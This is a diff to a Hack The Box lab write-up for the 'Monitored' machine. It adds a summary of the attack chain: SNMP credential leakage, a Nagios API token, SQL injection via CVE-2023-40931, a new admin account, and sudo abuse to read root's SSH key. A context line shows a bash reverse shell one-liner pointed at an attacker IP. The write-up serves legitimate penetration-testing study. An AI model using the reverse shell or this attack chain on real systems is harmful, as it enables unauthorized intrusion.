@@ -10,11 +10,16 @@ categories: [Hack The Box, "Season 4: Savage Lands"]
 tags: [labs,snmp,snmpwalk,nagios XI]
 ---
  
- [Link: Pwned Date](https://www.hackthebox.com/achievement/machine/1504363/583)
+
 
 # WriteUp
+- [Link: Pwned Date](https://www.hackthebox.com/achievement/machine/1504363/583)
 
-# User
+## Description
+
+- Monitored is a medium-difficulty Linux machine that features a Nagios instance. Credentials for the service are obtained via the SNMP protocol, which reveals a username and password combination provided as command-line parameters. Using the Nagios API, an authentication token for a disabled account is obtained, which leads to access to the application's dashboard. From there, a SQL injection ([`CVE-2023-40931`](https://nvd.nist.gov/vuln/detail/CVE-2023-40931)) is abused to obtain an administrator API key, with which a new admin account is created and used to run arbitrary commands on the instance, leading to a reverse shell. Finally, `sudo` access to a bash script is abused to read the `root` user's SSH key and authenticate as `root`.
+
+## User
 
 - We start with a port scan. With it, we notice that the machine has the TCP ports `22, 80, 389, 443, 5667` open.
 
@@ -170,6 +175,7 @@ bash -c 'bash -i>&/dev/tcp/10.10.14.162/443 0>&1'
 
 ![](/assets/images/HTB-Writeup-Monitored/Pasted image 20240407210550.png)
 
+## Root
 
 - When running `sudo -l`, we noticed that we can execute several commands with `sudo` without providing a password.
 
